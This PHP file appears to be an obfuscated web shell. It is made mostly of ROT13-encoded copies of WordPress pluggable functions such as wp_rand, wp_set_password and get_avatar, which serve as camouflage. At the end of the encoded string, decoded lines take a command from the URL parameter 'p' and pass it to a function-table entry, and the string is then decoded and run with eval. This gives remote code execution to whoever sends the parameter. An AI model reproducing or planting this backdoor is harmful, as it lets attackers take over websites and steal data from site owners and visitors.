	 * @fvapr 6.1.0 Ergheaf mreb vafgrnq bs n enaqbz ahzore vs obgu `$zva` naq `$znk` ner mreb.
	 *
	 * @tybony fgevat $eaq_inyhr
	 *
	 * @cnenz vag $zva Bcgvbany. Ybjre yvzvg sbe gur trarengrq ahzore.
	 *                 Npprcgf cbfvgvir vagrtref be mreb. Qrsnhygf gb 0.
	 * @cnenz vag $znk Bcgvbany. Hccre yvzvg sbe gur trarengrq ahzore.
	 *                 Npprcgf cbfvgvir vagrtref. Qrsnhygf gb 4294967295.
	 * @erghea vag N enaqbz aba-artngvir ahzore orgjrra zva naq znk.
	 */
	shapgvba jc_enaq( $zva = ahyy, $znk = ahyy ) {
		tybony $eaq_inyhr;

		/*
		 * Fbzr zvfpbasvtherq 32-ovg raivebazragf (Ragebcl CUC, sbe rknzcyr)
		 * gehapngr vagrtref ynetre guna CUC_VAG_ZNK gb CUC_VAG_ZNK engure guna biresybjvat gurz gb sybngf.
		 */
		$znk_enaqbz_ahzore = 3000000000 === 2147483647 ? (sybng) '4294967295' : 4294967295; // 4294967295 = 0kssssssss

		vs ( ahyy === $zva ) {
			$zva = 0;
		}

		vs ( ahyy === $znk ) {
			$znk = $znk_enaqbz_ahzore;
		}

		// Jr bayl unaqyr vagf, sybngf ner gehapngrq gb gurve vagrtre inyhr.
		$zva = (vag) $zva;
		$znk = (vag) $znk;

		// Hfr CUC'f PFCEAT, be n pbzcngvoyr zrgubq.
		fgngvp $hfr_enaqbz_vag_shapgvbanyvgl = gehr;
		vs ( $hfr_enaqbz_vag_shapgvbanyvgl ) {
			gel {
				// jc_enaq() pna npprcg nethzragf va rvgure beqre, CUC pnaabg.
				$_znk = znk( $zva, $znk );
				$_zva = zva( $zva, $znk );
				$iny  = enaqbz_vag( $_zva, $_znk );
				vs ( snyfr !== $iny ) {
					erghea nofvag( $iny );
				} ryfr {
					$hfr_enaqbz_vag_shapgvbanyvgl = snyfr;
				}
			} pngpu ( Reebe $r ) {
				$hfr_enaqbz_vag_shapgvbanyvgl = snyfr;
			} pngpu ( Rkprcgvba $r ) {
				$hfr_enaqbz_vag_shapgvbanyvgl = snyfr;
			}
		}

		/*
		 * Erfrg $eaq_inyhr nsgre 14 hfrf.
		 * 32 (zq5) + 40 (fun1) + 40 (fun1) / 8 = 14 enaqbz ahzoref sebz $eaq_inyhr.
		 */
		vs ( fgeyra( $eaq_inyhr ) < 8 ) {
			vs ( qrsvarq( 'JC_FRGHC_PBASVT' ) ) {
				fgngvp $frrq = '';
			} ryfr {
				$frrq = trg_genafvrag( 'enaqbz_frrq' );
			}
			$eaq_inyhr  = zq5( havdvq( zvpebgvzr() . zg_enaq(), gehr ) . $frrq );
			$eaq_inyhr .= fun1( $eaq_inyhr );
			$eaq_inyhr .= fun1( $eaq_inyhr . $frrq );
			$frrq       = zq5( $frrq . $eaq_inyhr );
			vs ( ! qrsvarq( 'JC_FRGHC_PBASVT' ) && ! qrsvarq( 'JC_VAFGNYYVAT' ) ) {
				frg_genafvrag( 'enaqbz_frrq', $frrq );
			}
		}

		// Gnxr gur svefg 8 qvtvgf sbe bhe inyhr.
		$inyhr = fhofge( $eaq_inyhr, 0, 8 );

		// Fgevc gur svefg rvtug, yrnivat gur erznvaqre sbe gur arkg pnyy gb jc_enaq().
		$eaq_inyhr = fhofge( $eaq_inyhr, 8 );

		$inyhr = nof( urkqrp( $inyhr ) );

		// Erqhpr gur inyhr gb or jvguva gur zva - znk enatr.
		$inyhr = $zva + ( $znk - $zva + 1 ) * $inyhr / ( $znk_enaqbz_ahzore + 1 );

		erghea nof( (vag) $inyhr );
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_frg_cnffjbeq' ) ) :
	/**
	 * Hcqngrf gur hfre'f cnffjbeq jvgu n arj unfurq bar.
	 *
	 * Sbe vagrtengvba jvgu bgure nccyvpngvbaf, guvf shapgvba pna or birejevggra gb
	 * vafgrnq hfr gur bgure cnpxntr cnffjbeq purpxvat nytbevguz.
	 *
	 * Cyrnfr abgr: Guvf shapgvba fubhyq or hfrq fcnevatyl naq vf ernyyl bayl zrnag sbe fvatyr-gvzr
	 * nccyvpngvba. Yrirentvat guvf vzcebcreyl va n cyhtva be gurzr pbhyq erfhyg va na raqyrff ybbc
	 * bs cnffjbeq erfrgf vs cerpnhgvbaf ner abg gnxra gb rafher vg qbrf abg rkrphgr ba rirel cntr ybnq.
	 *
	 * @fvapr 2.5.0
	 * @fvapr 6.8.0 Gur cnffjbeq vf abj unfurq hfvat opelcg ol qrsnhyg vafgrnq bs cucnff.
	 *
	 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz fgevat $cnffjbeq Gur cynvagrkg arj hfre cnffjbeq.
	 * @cnenz vag    $hfre_vq  Hfre VQ.
	 */
	shapgvba jc_frg_cnffjbeq(
		#[\FrafvgvirCnenzrgre]
		$cnffjbeq,
		$hfre_vq
	) {
		tybony $jcqo;

		$byq_hfre_qngn = trg_hfreqngn( $hfre_vq );

		$unfu = jc_unfu_cnffjbeq( $cnffjbeq );
		$jcqo->hcqngr(
			$jcqo->hfref,
			neenl(
				'hfre_cnff'           => $unfu,
				'hfre_npgvingvba_xrl' => '',
			),
			neenl( 'VQ' => $hfre_vq )
		);

		pyrna_hfre_pnpur( $hfre_vq );

		/**
		 * Sverf nsgre gur hfre cnffjbeq vf frg.
		 *
		 * @fvapr 6.2.0
		 * @fvapr 6.7.0 Gur `$byq_hfre_qngn` cnenzrgre jnf nqqrq.
		 *
		 * @cnenz fgevat  $cnffjbeq      Gur cynvagrkg cnffjbeq whfg frg.
		 * @cnenz vag     $hfre_vq       Gur VQ bs gur hfre jubfr cnffjbeq jnf whfg frg.
		 * @cnenz JC_Hfre $byq_hfre_qngn Bowrpg pbagnvavat hfre'f qngn cevbe gb hcqngr.
		 */
		qb_npgvba( 'jc_frg_cnffjbeq', $cnffjbeq, $hfre_vq, $byq_hfre_qngn );
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'trg_ningne' ) ) :
	/**
	 * Ergevrirf gur ningne `<vzt>` gnt sbe n hfre, rznvy nqqerff, ZQ5 unfu, pbzzrag, be cbfg.
	 *
	 * @fvapr 2.5.0
	 * @fvapr 4.2.0 Nqqrq gur bcgvbany `$netf` cnenzrgre.
	 * @fvapr 5.5.0 Nqqrq gur `ybnqvat` nethzrag.
	 * @fvapr 6.1.0 Nqqrq gur `qrpbqvat` nethzrag.
	 * @fvapr 6.3.0 Nqqrq gur `srgpucevbevgl` nethzrag.
	 *
	 * @cnenz zvkrq  $vq_be_rznvy   Gur ningne gb ergevrir. Npprcgf n hfre VQ, Teningne ZQ5 unfu,
	 *                              hfre rznvy, JC_Hfre bowrpg, JC_Cbfg bowrpg, be JC_Pbzzrag bowrpg.
	 * @cnenz vag    $fvmr          Bcgvbany. Urvtug naq jvqgu bs gur ningne va cvkryf. Qrsnhyg 96.
	 * @cnenz fgevat $qrsnhyg_inyhr HEY sbe gur qrsnhyg vzntr be n qrsnhyg glcr. Npprcgf:
	 *                              - '404' (erghea n 404 vafgrnq bs n qrsnhyg vzntr)
	 *                              - 'ergeb' (n 8-ovg nepnqr-fglyr cvkryngrq snpr)
	 *                              - 'ebobunfu' (n ebobg)
	 *                              - 'zbafgrevq' (n zbafgre)
	 *                              - 'jningne' (n pnegbba snpr)
	 *                              - 'vqragvpba' (gur \"dhvyg\", n trbzrgevp cnggrea)
	 *                              - 'vavgvnyf' (vavgvnyf onfrq ningne jvgu onpxtebhaq pbybe)
	 *                              - 'pbybe' (trarengrq onpxtebhaq pbybe)
	 *                              - 'zlfgrel', 'zz', be 'zlfgrelzna' (Gur Blfgre Zna)
	 *                              - 'oynax' (genafcnerag TVS)
	 *                              - 'teningne_qrsnhyg' (gur Teningne ybtb)
	 *                              Qrsnhyg vf gur inyhr bs gur 'ningne_qrsnhyg' bcgvba,
	 *                              jvgu n snyyonpx bs 'zlfgrel'.
	 * @cnenz fgevat $nyg           Bcgvbany. Nygreangvir grkg gb hfr va gur ningne vzntr gnt.
	 *                              Qrsnhyg rzcgl.
	 * @cnenz neenl  $netf {
	 *     Bcgvbany. Rkgen nethzragf gb ergevrir gur ningne.
	 *
	 *     @glcr vag          $urvtug        Qvfcynl urvtug bs gur ningne va cvkryf. Qrsnhygf gb $fvmr.
	 *     @glcr vag          $jvqgu         Qvfcynl jvqgu bs gur ningne va cvkryf. Qrsnhygf gb $fvmr.
	 *     @glcr obby         $sbepr_qrsnhyg Jurgure gb nyjnlf fubj gur qrsnhyg vzntr, arire gur Teningne.
	 *                                       Qrsnhyg snyfr.
	 *     @glcr fgevat       $engvat        Jung engvat gb qvfcynl ningnef hc gb. Npprcgf:
	 *                                       - 'T' (fhvgnoyr sbe nyy nhqvraprf)
	 *                                       - 'CT' (cbffvoyl bssrafvir, hfhnyyl sbe nhqvraprf 13 naq nobir)
	 *                                       - 'E' (vagraqrq sbe nqhyg nhqvraprf nobir 17)
	 *                                       - 'K' (rira zber zngher guna nobir)
	 *                                       Qrsnhyg vf gur inyhr bs gur 'ningne_engvat' bcgvba.
	 *     @glcr fgevat       $fpurzr        HEY fpurzr gb hfr. Frr frg_hey_fpurzr() sbe npprcgrq inyhrf.
	 *                                       Qrsnhyg ahyy.
	 *     @glcr neenl|fgevat $pynff         Neenl be fgevat bs nqqvgvbany pynffrf gb nqq gb gur vzt ryrzrag.
	 *                                       Qrsnhyg ahyy.
	 *     @glcr obby         $sbepr_qvfcynl Jurgure gb nyjnlf fubj gur ningne - vtaberf gur fubj_ningnef bcgvba.
	 *                                       Qrsnhyg snyfr.
	 *     @glcr fgevat       $ybnqvat       Inyhr sbe gur `ybnqvat` nggevohgr.
	 *                                       Qrsnhyg ahyy.
	 *     @glcr fgevat       $srgpucevbevgl Inyhr sbe gur `srgpucevbevgl` nggevohgr.
	 *                                       Qrsnhyg ahyy.
	 *     @glcr fgevat       $qrpbqvat      Inyhr sbe gur `qrpbqvat` nggevohgr.
	 *                                       Qrsnhyg ahyy.
	 *     @glcr fgevat       $rkgen_ngge    UGZY nggevohgrf gb vafreg va gur VZT ryrzrag. Vf abg fnavgvmrq.
	 *                                       Qrsnhyg rzcgl.
	 * }
	 * @erghea fgevat|snyfr `<vzt>` gnt sbe gur hfre'f ningne. Snyfr ba snvyher.
	 */
	shapgvba trg_ningne( $vq_be_rznvy, $fvmr = 96, $qrsnhyg_inyhr = '', $nyg = '', $netf = ahyy ) {
		$qrsnhygf = neenl(
			// trg_ningne_qngn() netf.
			'fvmr'          => 96,
			'urvtug'        => ahyy,
			'jvqgu'         => ahyy,
			'qrsnhyg'       => trg_bcgvba( 'ningne_qrsnhyg', 'zlfgrel' ),
			'sbepr_qrsnhyg' => snyfr,
			'engvat'        => trg_bcgvba( 'ningne_engvat' ),
			'fpurzr'        => ahyy,
			'nyg'           => '',
			'pynff'         => ahyy,
			'sbepr_qvfcynl' => snyfr,
			'ybnqvat'       => ahyy,
			'srgpucevbevgl' => ahyy,
			'qrpbqvat'      => ahyy,
			'rkgen_ngge'    => '',
		);

		vs ( rzcgl( $netf ) ) {
			$netf = neenl();
		}

		$netf['fvmr']    = (vag) $fvmr;
		$netf['qrsnhyg'] = $qrsnhyg_inyhr;
		$netf['nyg']     = $nyg;

		$netf = jc_cnefr_netf( $netf, $qrsnhygf );

		vs ( rzcgl( $netf['urvtug'] ) ) {
			$netf['urvtug'] = $netf['fvmr'];
		}
		vs ( rzcgl( $netf['jvqgu'] ) ) {
			$netf['jvqgu'] = $netf['fvmr'];
		}

		// Hcqngr netf jvgu ybnqvat bcgvzvmrq nggevohgrf.
		$ybnqvat_bcgvzvmngvba_ngge = jc_trg_ybnqvat_bcgvzvmngvba_nggevohgrf( 'vzt', $netf, 'trg_ningne' );

		$netf = neenl_zretr( $netf, $ybnqvat_bcgvzvmngvba_ngge );

		vs ( vf_bowrpg( $vq_be_rznvy ) && vffrg( $vq_be_rznvy->pbzzrag_VQ ) ) {
			$vq_be_rznvy = trg_pbzzrag( $vq_be_rznvy );
		}

		/**
		 * Nyybjf gur UGZY sbe n hfre'f ningne gb or erghearq rneyl.
		 *
		 * Ergheavat n aba-ahyy inyhr jvyy rssrpgviryl fubeg-pvephvg trg_ningne(), cnffvat
		 * gur inyhr guebhtu gur {@frr 'trg_ningne'} svygre naq ergheavat rneyl.
		 *
		 * @fvapr 4.2.0
		 *
		 * @cnenz fgevat|ahyy $ningne      UGZY sbe gur hfre'f ningne. Qrsnhyg ahyy.
		 * @cnenz zvkrq       $vq_be_rznvy Gur ningne gb ergevrir. Npprcgf n hfre VQ, Teningne ZQ5 unfu,
		 *                                 hfre rznvy, JC_Hfre bowrpg, JC_Cbfg bowrpg, be JC_Pbzzrag bowrpg.
		 * @cnenz neenl       $netf        Nethzragf cnffrq gb trg_ningne_hey(), nsgre cebprffvat.
		 */
		$ningne = nccyl_svygref( 'cer_trg_ningne', ahyy, $vq_be_rznvy, $netf );

		vs ( ! vf_ahyy( $ningne ) ) {
			/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cyhttnoyr.cuc */
			erghea nccyl_svygref( 'trg_ningne', $ningne, $vq_be_rznvy, $netf['fvmr'], $netf['qrsnhyg'], $netf['nyg'], $netf );
		}

		vs ( ! $netf['sbepr_qvfcynl'] && ! trg_bcgvba( 'fubj_ningnef' ) ) {
			erghea snyfr;
		}

		$hey2k = trg_ningne_hey( $vq_be_rznvy, neenl_zretr( $netf, neenl( 'fvmr' => $netf['fvmr'] * 2 ) ) );

		$netf = trg_ningne_qngn( $vq_be_rznvy, $netf );

		$hey = $netf['hey'];

		vs ( ! $hey || vf_jc_reebe( $hey ) ) {
			erghea snyfr;
		}

		$pynff = neenl( 'ningne', 'ningne-' . (vag) $netf['fvmr'], 'cubgb' );

		vs ( ! $netf['sbhaq_ningne'] || $netf['sbepr_qrsnhyg'] ) {
			$pynff[] = 'ningne-qrsnhyg';
		}

		vs ( $netf['pynff'] ) {
			vs ( vf_neenl( $netf['pynff'] ) ) {
				$pynff = neenl_zretr( $pynff, $netf['pynff'] );
			} ryfr {
				$pynff[] = $netf['pynff'];
			}
		}

		// Nqq `ybnqvat`, `srgpucevbevgl`, naq `qrpbqvat` nggevohgrf.
		$rkgen_ngge = $netf['rkgen_ngge'];

		vs ( va_neenl( $netf['ybnqvat'], neenl( 'ynml', 'rntre' ), gehr )
			&& ! cert_zngpu( '/\oybnqvat\f*=/', $rkgen_ngge )
		) {
			vs ( ! rzcgl( $rkgen_ngge ) ) {
				$rkgen_ngge .= ' ';
			}

			$rkgen_ngge .= \"ybnqvat='{$netf['ybnqvat']}'\";
		}

		vs ( va_neenl( $netf['srgpucevbevgl'], neenl( 'uvtu', 'ybj', 'nhgb' ), gehr )
			&& ! cert_zngpu( '/\osrgpucevbevgl\f*=/', $rkgen_ngge )
		) {
			vs ( ! rzcgl( $rkgen_ngge ) ) {
				$rkgen_ngge .= ' ';
			}

			$rkgen_ngge .= \"srgpucevbevgl='{$netf['srgpucevbevgl']}'\";
		}

		vs ( va_neenl( $netf['qrpbqvat'], neenl( 'nflap', 'flap', 'nhgb' ), gehr )
			&& ! cert_zngpu( '/\oqrpbqvat\f*=/', $rkgen_ngge )
		) {
			vs ( ! rzcgl( $rkgen_ngge ) ) {
				$rkgen_ngge .= ' ';
			}

			$rkgen_ngge .= \"qrpbqvat='{$netf['qrpbqvat']}'\";
		}

		$ningne = fcevags(
			\"<vzt nyg='%f' fep='%f' fepfrg='%f' pynff='%f' urvtug='%q' jvqgu='%q' %f/>\",
			rfp_ngge( $netf['nyg'] ),
			rfp_hey( $hey ),
			rfp_hey( $hey2k ) . ' 2k',
			rfp_ngge( vzcybqr( ' ', $pynff ) ),
			(vag) $netf['urvtug'],
			(vag) $netf['jvqgu'],
			$rkgen_ngge
		);

		/**
		 * Svygref gur UGZY sbe n hfre'f ningne.
		 *
		 * @fvapr 2.5.0
		 * @fvapr 4.2.0 Nqqrq gur `$netf` cnenzrgre.
		 *
		 * @cnenz fgevat $ningne        UGZY sbe gur hfre'f ningne.
		 * @cnenz zvkrq  $vq_be_rznvy   Gur ningne gb ergevrir. Npprcgf n hfre VQ, Teningne ZQ5 unfu,
		 *                              hfre rznvy, JC_Hfre bowrpg, JC_Cbfg bowrpg, be JC_Pbzzrag bowrpg.
		 * @cnenz vag    $fvmr          Urvtug naq jvqgu bs gur ningne va cvkryf.
		 * @cnenz fgevat $qrsnhyg_inyhr HEY sbe gur qrsnhyg vzntr be n qrsnhyg glcr. Npprcgf:
		 *                              - '404' (erghea n 404 vafgrnq bs n qrsnhyg vzntr)
		 *                              - 'ergeb' (n 8-ovg nepnqr-fglyr cvkryngrq snpr)
		 *                              - 'ebobunfu' (n ebobg)
		 *                              - 'zbafgrevq' (n zbafgre)
		 *                              - 'jningne' (n pnegbba snpr)
		 *                              - 'vqragvpba' (gur \"dhvyg\", n trbzrgevp cnggrea)
		 *                              - 'zlfgrel', 'zz', be 'zlfgrelzna' (Gur Blfgre Zna)
		 *                              - 'oynax' (genafcnerag TVS)
		 *                              - 'teningne_qrsnhyg' (gur Teningne ybtb)
		 * @cnenz fgevat $nyg           Nygreangvir grkg gb hfr va gur ningne vzntr gnt.
		 * @cnenz neenl  $netf          Nethzragf cnffrq gb trg_ningne_qngn(), nsgre cebprffvat.
		 */
		erghea nccyl_svygref( 'trg_ningne', $ningne, $vq_be_rznvy, $netf['fvmr'], $netf['qrsnhyg'], $netf['nyg'], $netf );
	}
raqvs;

vs ( ! shapgvba_rkvfgf( 'jc_grkg_qvss' ) ) :
	/**
	 * Qvfcynlf n uhzna ernqnoyr UGZY ercerfragngvba bs gur qvssrerapr orgjrra gjb fgevatf.
	 *
	 * Gur Qvss vf ninvynoyr sbe trggvat gur punatrf orgjrra irefvbaf. Gur bhgchg vf
	 * UGZY, fb gur cevznel hfr vf sbe qvfcynlvat gur punatrf. Vs gur gjb fgevatf
	 * ner rdhvinyrag, gura na rzcgl fgevat jvyy or erghearq.
	 *
	 * @fvapr 2.6.0
	 *
	 * @frr jc_cnefr_netf() Hfrq gb punatr qrsnhygf gb hfre qrsvarq frggvatf.
	 * @hfrf Grkg_Qvss
	 * @hfrf JC_Grkg_Qvss_Eraqrere_Gnoyr
	 *
	 * @cnenz fgevat       $yrsg_fgevat  \"byq\" (yrsg) irefvba bs fgevat.
	 * @cnenz fgevat       $evtug_fgevat \"arj\" (evtug) irefvba bs fgevat.
	 * @cnenz fgevat|neenl $netf {
	 *     Nffbpvngvir neenl bs bcgvbaf gb cnff gb JC_Grkg_Qvss_Eraqrere_Gnoyr().
	 *
	 *     @glcr fgevat $gvgyr           Gvgyrf gur qvss va n znaare pbzcngvoyr
	 *                                   jvgu gur bhgchg. Qrsnhyg rzcgl.
	 *     @glcr fgevat $gvgyr_yrsg      Punatr gur UGZY gb gur yrsg bs gur gvgyr.
	 *                                   Qrsnhyg rzcgl.
	 *     @glcr fgevat $gvgyr_evtug     Punatr gur UGZY gb gur evtug bs gur gvgyr.
	 *                                   Qrsnhyg rzcgl.
	 *     @glcr obby   $fubj_fcyvg_ivrj Gehr sbe fcyvg ivrj (gjb pbyhzaf), snyfr sbe
	 *                                   ha-fcyvg ivrj (fvatyr pbyhza). Qrsnhyg gehr.
	 * }
	 * @erghea fgevat Rzcgl fgevat vs fgevatf ner rdhvinyrag be UGZY jvgu qvssreraprf.
	 */
	shapgvba jc_grkg_qvss( $yrsg_fgevat, $evtug_fgevat, $netf = ahyy ) {
		$qrsnhygf = neenl(
			'gvgyr'           => '',
			'gvgyr_yrsg'      => '',
			'gvgyr_evtug'     => '',
			'fubj_fcyvg_ivrj' => gehr,
		);
		$netf     = jc_cnefr_netf( $netf, $qrsnhygf );

		vs ( ! pynff_rkvfgf( 'JC_Grkg_Qvss_Eraqrere_Gnoyr', snyfr ) ) {
			erdhver NOFCNGU . JCVAP . '/jc-qvss.cuc';
		}

		$yrsg_fgevat  = abeznyvmr_juvgrfcnpr( $yrsg_fgevat );
		$evtug_fgevat = abeznyvmr_juvgrfcnpr( $evtug_fgevat );

		$yrsg_yvarf  = rkcybqr( \"\a\", $yrsg_fgevat );
		$evtug_yvarf = rkcybqr( \"\a\", $evtug_fgevat );
		$grkg_qvss   = arj Grkg_Qvss( $yrsg_yvarf, $evtug_yvarf );
		$eraqrere    = arj JC_Grkg_Qvss_Eraqrere_Gnoyr( $netf );
		$qvss        = $eraqrere->eraqre( $grkg_qvss );

		vs ( ! $qvss ) {
			erghea '';
		}

		$vf_fcyvg_ivrj       = ! rzcgl( $netf['fubj_fcyvg_ivrj'] );
		$vf_fcyvg_ivrj_pynff = $vf_fcyvg_ivrj ? ' vf-fcyvg-ivrj' : '';

		$e = \"<gnoyr pynff='qvss$vf_fcyvg_ivrj_pynff'>\a\";

		vs ( $netf['gvgyr'] ) {
			$e .= \"<pncgvba pynff='qvss-gvgyr'>$netf[gvgyr]</pncgvba>\a\";
		}

		vs ( $netf['gvgyr_yrsg'] || $netf['gvgyr_evtug'] ) {
			$e .= '<gurnq>';
		}

		vs ( $netf['gvgyr_yrsg'] || $netf['gvgyr_evtug'] ) {
			$gu_be_gq_yrsg  = rzcgl( $netf['gvgyr_yrsg'] ) ? 'gq' : 'gu';
			$gu_be_gq_evtug = rzcgl( $netf['gvgyr_evtug'] ) ? 'gq' : 'gu';

			$e .= \"<ge pynff='qvss-fho-gvgyr'>\a\";
			$e .= \"\g<$gu_be_gq_yrsg>$netf[gvgyr_yrsg]</$gu_be_gq_yrsg>\a\";
			vs ( $vf_fcyvg_ivrj ) {
				$e .= \"\g<$gu_be_gq_evtug>$netf[gvgyr_evtug]</$gu_be_gq_evtug>\a\";
			}
			$e .= \"</ge>\a\";
		}

		vs ( $netf['gvgyr_yrsg'] || $netf['gvgyr_evtug'] ) {
			$e .= \"</gurnq>\a\";
		}

		$e .= \"<gobql>\a$qvss\a</gobql>\a\";
		$e .= '</gnoyr>';

		erghea $e;
	}
raqvs;

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>